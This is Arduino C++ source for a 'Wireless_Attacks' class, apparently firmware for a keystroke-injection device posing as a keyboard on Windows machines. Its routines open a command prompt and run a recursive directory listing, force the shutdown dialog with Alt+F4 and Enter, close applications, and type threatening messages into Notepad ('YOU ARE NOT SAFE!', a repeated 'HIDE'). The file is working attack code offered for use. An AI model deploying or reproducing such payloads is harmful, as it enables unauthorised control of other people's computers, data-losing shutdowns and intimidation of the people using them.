#include "WirelessAttacks.h"
void Wireless_Attacks::init()
{
    Serial.begin(9600);
    Keyboard.begin();
}
void Wireless_Attacks::TEST_1() {
    Keyboard.press(KEY_LEFT_GUI);
    delay(100);
    Keyboard.press('r');
    delay(100); 
    Keyboard.releaseAll(); 
    delay(100); 
    Keyboard.print("cmd");
    delay(100); 
    Keyboard.press(KEY_RETURN);
    Keyboard.release(KEY_RETURN);
    delay(1000);
    Keyboard.print("color a");
    delay(100);
    Keyboard.press(KEY_RETURN);
    Keyboard.release(KEY_RETURN);
    delay(1000);
    Keyboard.print("dir/s");
    delay(100);
    Keyboard.press(KEY_RETURN);
    Keyboard.release(KEY_RETURN);
    delay(1000);
    Keyboard.press(KEY_F11);
    delay(100);
    Keyboard.releaseAll();
}


void Wireless_Attacks::RemoteShutdown()
{
    Keyboard.press(KEY_LEFT_GUI);
    Keyboard.press('d');
    Keyboard.releaseAll();
    delay(2);
    Keyboard.press(KEY_LEFT_ALT);
    Keyboard.press(KEY_F4);
    delay(3);
    Keyboard.releaseAll();
    Keyboard.press(KEY_RETURN);
    Keyboard.releaseAll();
}

void Wireless_Attacks::CloseApplication()
{
    Keyboard.press(KEY_LEFT_ALT);
    Keyboard.press(KEY_F4);
    Keyboard.releaseAll();
}

void Wireless_Attacks::RickRoll()
{

}

void Wireless_Attacks::CreepyMessage()
{
    Keyboard.press(KEY_LEFT_GUI);
    delay(100);
    Keyboard.press('r');
    delay(100); 
    Keyboard.releaseAll(); 
    delay(100); 
    Keyboard.print("cmd");
    delay(100); 
    Keyboard.press(KEY_RETURN);
    Keyboard.release(KEY_RETURN);
    delay(500);
    Keyboard.print("start notepad");
    Keyboard.press(KEY_RETURN);
    Keyboard.release(KEY_RETURN);
    delay(400);
    Keyboard.print("THEY ARE LOOKING AT YOU");
    Keyboard.press(KEY_RETURN);
    Keyboard.release(KEY_RETURN);
    delay(2000);
    Keyboard.print("YOU ARE NOT SAFE!");
    Keyboard.press(KEY_RETURN);
    Keyboard.release(KEY_RETURN);
    delay(2000);
    Keyboard.print("THEY ARE AFTER YOUR SOUL.......");
    Keyboard.press(KEY_RETURN);
    Keyboard.release(KEY_RETURN);
    delay(2000);
    Keyboard.print("YOU NEED TO HIDE!");
    Keyboard.press(KEY_RETURN);
    Keyboard.release(KEY_RETURN);
    delay(2000);
    Keyboard.print("THEY ARE COMMING FOR YOU");
    delay(4000);
    for(int i = 0; i < 30; i++)
    {
        Keyboard.press(KEY_RETURN);
        Keyboard.release(KEY_RETURN);
        Keyboard.print("HIDE.....");
        delay(1000);
        
    }
}